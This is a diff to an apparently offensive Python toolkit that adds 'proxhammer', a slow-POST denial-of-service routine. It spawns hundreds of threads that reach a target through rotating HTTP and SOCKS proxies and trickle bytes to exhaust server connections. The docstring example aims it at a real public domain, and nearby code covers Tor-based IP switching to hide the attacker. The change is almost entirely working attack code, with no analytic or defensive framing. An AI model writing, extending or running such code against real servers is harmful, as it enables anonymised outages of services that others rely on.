@@ -557,6 +557,102 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True)
   except KeyboardInterrupt:
    stop=True
    break
+class pham(threading.Thread):
+ def run(self):
+  global counter
+  while (stop!=True):
+   try:
+    z=random.randint(1,20)
+    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+     line=random.choice(httplist)
+    elif (z in [13,14,15,16]):
+     line=random.choice(socks4list)
+    elif (z in [17,18,19,20]):
+     line=random.choice(socks5list)
+    ipp=line.split(":")[0].split("=")[0]
+    pp=line.split(":")[1].split("=")[0]
+    s =socks.socksocket()
+    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
+    elif (z in [13,14,15,16]):
+     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
+    elif (z in [17,18,19,20]):
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    if z<13:
+     s.settimeout=(timeout)
+    s.connect((target,port))
+    if ((port==443)or(port==8443)):
+     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+    q=random.randint(10000,15000)
+    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,target))
+    for i in range(q):
+     if stop==True:
+      break
+     h=random.choice(lis)
+     try:
+      s.send(h)
+      if prints==True:
+       print"Posted: {}".format(h)
+      time.sleep(random.uniform(.1,3))
+     except Exception as dx:
+      pass
+    s.close()
+   except Exception as e:
+    pass
+   time.sleep(.1)
+   if stop==True:
+    break
+def proxhammer(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True):
+ '''
+  u: target ip or domain
+  p: (set by default to: 80) targeted port
+  threads: (set by default to: 500) number of connections
+  maxtime: (set by default to: 5) the connection timeout flag value
+  example:
+  >>>import bane
+  >>>bane.proxhammer('www.google.com',threads=256)
+'''
+ global httplist
+ if httpl:
+  httplist=httpl
+ else:
+  httplist=masshttp()
+ global socks4list
+ if socks4l:
+  socks4list=socks4l
+ else:
+  socks4list=massocks4()
+ global socks5list
+ if socks5l:
+  socks5list=socks5l
+ else:
+  socks5list=massocks5()
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global pointer
+ global target
+ target=u
+ global port
+ port=p
+ global timeout
+ timeout=maxtime
+ for j in range(threads):
+    t=pham()
+    t.start()
+    time.sleep(.001)
+ c=time.time()
+ while True:
+  try:
+   time.sleep(.1)
+   if int(time.time()-c)==interval:
+    stop=True
+    break
+  except KeyboardInterrupt:
+   stop=True
+   break
 def torswitch1(new=30,logs=True):
  '''
     this function is for auto ip switching of tor's nodes, it doesnt work on windows because it use the command on linux to restart tor' service in a chosen interval.
